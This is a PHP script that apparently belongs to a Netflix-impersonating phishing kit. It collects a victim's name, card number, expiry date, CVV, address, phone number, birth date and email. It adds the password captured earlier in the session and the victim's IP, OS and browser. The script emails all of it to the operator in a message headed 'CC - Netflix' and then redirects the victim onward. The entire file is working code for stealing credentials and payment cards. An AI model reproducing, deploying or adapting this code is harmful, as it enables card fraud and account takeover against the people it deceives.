<?php


	session_start();
	include("../../../assest/browsers.php");
	include("../../../assest/conf.php");
	
	
	$ip = getenv("REMOTE_ADDR");
		
	$ppfname = $_POST["ppfname"];
	
	$pplname = $_POST["pplname"];
	
	$ppcc = $_POST["ppcc"];
	
	$ppccexp = $_POST["ppccexp"];
	
	$ppcvv = $_POST["ppcvv"];
	
	$ppaddress = $_POST["ppaddress"];
	
	$ppcity = $_POST["ppcity"];
	
	$ppzip = $_POST["ppzip"];
	
	$ppphone = $_POST["ppphone"];
	
	$ppbirth = $_POST["ppbirth"];
	
	$nfemail = $_POST["nfemail"];
	
	$Password = $_SESSION["Password"];
	
	$_SESSION["ppfname"] = $ppfname;
	
	$_SESSION["pplname"] = $pplname;
	
	$_SESSION["ppcc"] = $ppcc;
	
	$_SESSION["ppccexp"] = $ppccexp;
	
	$_SESSION["ppcvv"] = $ppcvv;
	
	$_SESSION["ppaddress"] = $ppaddress;
	
	$_SESSION["ppcity"] = $ppcity;
	
	$_SESSION["ppzip"] = $ppzip;
	
	$_SESSION["ppphone"] = $ppphone;
	
	$_SESSION["ppbirth"] = $ppbirth;
	
	$_SESSION["nfemail"] = $nfemail;
	
	$Subject = "CC -  Netflix $ip ";

	
	
	$Content = "Email : ".$_SESSION["nfemail"]."\r\n";
	
	$Content .= "Password : ".$_SESSION["Password"]."\r\n";
	
	$Content .= "First Name:  ".$ppfname."\r\n";
	
	$Content .= "Last Name : ".$pplname."\r\n";
	
	$Content .= "CC : ".$ppcc."\r\n";
	
	$Content .= "Exp Date : ".$ppccexp."\r\n";
	
	$Content .= "CVV : ".$ppcvv."\r\n";
	
	$Content .= "Address : ".$ppaddress."\r\n";
	
	$Content .= "City : ".$ppcity."\r\n";
	
	$Content .= "Zip : ".$ppzip."\r\n";
	
	$Content .= "Phone number : ".$ppphone."\r\n";
	
	$Content .= "Date birth : ".$ppbirth."\r\n";
			
	$Content .= "IP : " .$_SERVER['REMOTE_ADDR']."\r\n";
	
	$Content .= "OS : " .$user_os."\r\n";
	
	$Content .= "Browser : " .$user_browser."\r\n";
	
	$Content .= "Agent : " .$_SERVER['HTTP_USER_AGENT']."\r\n";
	
	$MailHeaders = "From: contact@tvservices.uk\r\n";

	mail($to, $Subject, $Content, $MailHeaders);
		
	header("Location:../../U/");
	
	



?>